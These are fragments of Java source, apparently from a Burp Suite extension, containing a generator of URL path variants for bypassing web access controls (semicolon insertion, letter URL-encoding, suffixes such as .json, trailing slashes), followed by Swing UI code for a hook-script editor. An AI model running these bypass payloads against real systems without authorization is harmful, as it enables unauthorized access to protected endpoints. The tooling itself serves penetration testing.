        String currentPath = BurpTools.getIntruderWrappedText(attackConfiguration);
        return generateBypassPathPayloads(currentPath);
    }

public static Set<String> generateBypassPathPayloads(String path) {
        // 正常化处理下path
        path = HttpUtil.normalizePath(path);

        Set<String> payloads = new HashSet<>();
        if (path.isEmpty()) return payloads;
        String[] pathParts = path.split("/");
        if (pathParts.length == 0) return payloads;

        // 1. 在请求的每个/中间插入干扰字符，一般为getRequestUri引起.
        // 假设原始请求路径为/api/test，绕过字符为;，经过处理后应该生成如下路径/;/api/;/test
        for (String bypassString : bypassPathStep1StringArray) {
            for (int i = 0; i < path.length() - 1; i++) {
                if (path.charAt(i) == '/') {
                    String replaced = path.substring(0, i) + bypassString + path.substring(i + 1);
                    payloads.add(replaced);
                }
            }
        }
        // 2. URL编码请求路径，一般为getRequestUri引起,假设原始请求路径为/api/test，经过处理后应该生成如下路径,/%61%70%69/%74%65%73%74
        payloads.add(encodeAllLetters(path));
        // 3. 末尾添加.xxx的形式来绕过，一般为setUseSuffixPatternMatch引起,
        // 假设原始请求路径为/api/test，经过处理后应该生成如下路径/api/test.xxx
        if (!path.endsWith(".") && !path.endsWith("/")) {
            payloads.add(path + ".json");
            payloads.add(path + ".action");
            payloads.add(path + ".do");
        }
        // 4.
        // 末尾添加干扰字符的形式来绕过，一般为nginx配置了location=xxx这样的黑名单引起的,假设原始请求路径为/api/test，绕过字符为;，经过处理后应该生成如下路径/api/test;
        if (!path.endsWith("/")) {
            payloads.add(path + "/");
            payloads.add(path + "//");
            payloads.add(path + "/.");
            payloads.add(path + "/..");
            payloads.add(path + ";");
        } else {
            payloads.add(path.substring(0, path.length() - 1) + ";/");
        }
        // 5. 转换大小写
//        payloads.add(path.toUpperCase());
        // 6. 反斜
        payloads.add(path.replace("/", "\\/"));
        // 7. add more. 可参考文章: https://tttang.com/archive/1899/
        return payloads;
    }

public static String encodeAllLetters(String input) {
        StringBuilder result = new StringBuilder();

        for (char c : input.toCharArray()) {
            if (Character.isLetter(c)) {
                // 如果是字母，则进行URL编码
                String encoded = "%" + Integer.toHexString(c).toUpperCase();
                result.append(encoded);
            } else if (c == '%') {
                // 如果是%，直接将%及其后两个字符添加到结果中
                result.append(c);
                if (input.length() >= result.length() + 2) {
                    result.append(input, result.length(), result.length() + 2);
                }
            } else {
                // 如果是其他字符，直接添加到结果中
                result.append(c);
            }
        }

        return result.toString();
    }

private void initPanel() {
        codeCombo = new JComboBox<>();
        setLayout(new BorderLayout());
        // 创建顶部下拉框的面板
        JLabel selectLabel = new JLabel("Hook Script:");
        JPanel topPanel = new JPanel(new BorderLayout());
        selectLabel.setPreferredSize(new Dimension(CodeFileHookerPanel.getDescWidth(),
            selectLabel.getPreferredSize().height));
        selectLabel.setToolTipText(Constants.HOOK_BY_CODE_IMPL_DEF);
        JPanel rightPanel = new JPanel();
        JButton saveButton = new JButton("Save");
        JButton newButton = new JButton("New");
        JButton deleteButton = new JButton("Delete");
        rightPanel.add(selectLabel);
        rightPanel.add(codeCombo);
        rightPanel.add(saveButton);
        rightPanel.add(newButton);
        rightPanel.add(deleteButton);
        reloadExamples();

        topPanel.add(rightPanel, BorderLayout.WEST);


        // 创建 RTextScrollPane 并添加到 JFrame
        RTextScrollPane scrollPane = new RTextScrollPane(codeTextArea);

        add(topPanel, BorderLayout.NORTH);
        add(scrollPane, BorderLayout.CENTER);

        codeCombo.addItemListener(e -> {
            if (e.getStateChange() == ItemEvent.SELECTED) {
                codeTextArea.setVisible(true);
                codeTextArea.setText(FileTools.readFileAsString(getFilePath((String) e.getItem())));
                codeTextArea.setCaretPosition(0);
            } else {
                codeTextArea.setVisible(false);
            }
        });

        saveButton.addActionListener(e -> FileTools.writeFile(getFilePath((String) codeCombo.getSelectedItem()),
            codeTextArea.getText()));

        newButton.addActionListener(e -> {
            String filename = SwingTools.showInputDialog(api, "Please input filename: ");
            if (filename == null) return;
            if (!filename.endsWith(service.getSuffix())) {
                SwingTools.showErrorMessageDialog(api, "The suffix must be " + service.getSuffix());
                return;
            }
            String filepath = getFilePath(filename);
            if (FileTools.isExist(filepath)) {
                SwingTools.showErrorMessageDialog(api, "This already exists, please try again. ");
                return;
            }
            FileTools.createFiles(filepath);
            String content = FileTools.readResourceAsString("templates/HttpHookTemplate" + "." + service.getDir());
            FileTools.writeFile(filepath, content);
            reloadExamples();
            codeCombo.setSelectedItem(filename);
        });

        deleteButton.addActionListener(e -> {
            if (codeCombo.getSelectedIndex() == -1) return;
            String selectItem = (String) codeCombo.getSelectedItem();
            String filepath = getFilePath(selectItem);
            boolean res = SwingTools.showConfirmDialog(api, String.format("Are you sure you want to delete this: %s?",
                selectItem));
            if (!res) return;
            FileTools.deleteFiles(filepath);
            reloadExamples();
        });

        resetInput();

    }

